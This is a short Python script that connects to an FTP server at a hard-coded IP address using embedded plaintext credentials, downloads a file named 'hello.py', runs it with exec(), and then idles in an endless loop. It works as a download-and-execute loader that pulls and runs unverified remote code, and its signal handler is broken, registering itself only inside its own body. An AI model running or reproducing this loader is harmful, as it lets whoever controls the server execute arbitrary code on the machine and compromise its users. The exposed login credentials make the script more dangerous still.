import ftplib 
import signal
import time

def handler_stop_signals(signum, frame):

	signal.signal(signal.SIGINT, handler_stop_signals)
	signal.signal(signal.SIGTERM, handler_stop_signals)
	
path = "dow/"
filename = 'hello.py'

ftp = ftplib.FTP("31.170.167.199") 
ftp.login("u454940376", "Timo1234!") 
ftp.cwd(path)
ftp.retrbinary("RETR " + filename ,open(filename, 'wb').write)
ftp.quit()
exec(open("./hello.py").read())
while True:
    time.sleep(1)
